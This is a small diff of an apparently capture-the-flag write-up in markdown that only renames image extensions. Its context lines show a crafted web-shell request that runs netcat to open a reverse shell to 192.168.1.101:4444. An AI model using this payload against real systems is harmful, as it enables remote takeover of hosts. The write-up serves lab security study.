@@ -173,14 +173,14 @@ The CVE and CWE databases give us information on vulnerabilities found in the pr
 
             **Crafted payload:** `192.168.1.115/backdoor.php?cmd=nc 192.168.1.101 4444 -e /bin/bash`
 
-            ![17](/Resources/Images/2/17.PNG)
+            ![17](/Resources/Images/2/17.png)
 
             **Sensitive information has been found in the "www" and "WordPress uploads" directory**    
 
             **flag2**
 
-            ![19](/Resources/Images/2/19.PNG)
+            ![19](/Resources/Images/2/19.png)
 
             **flag3**
 
-            ![20](/Resources/Images/2/20.PNG)
+            ![20](/Resources/Images/2/20.png)
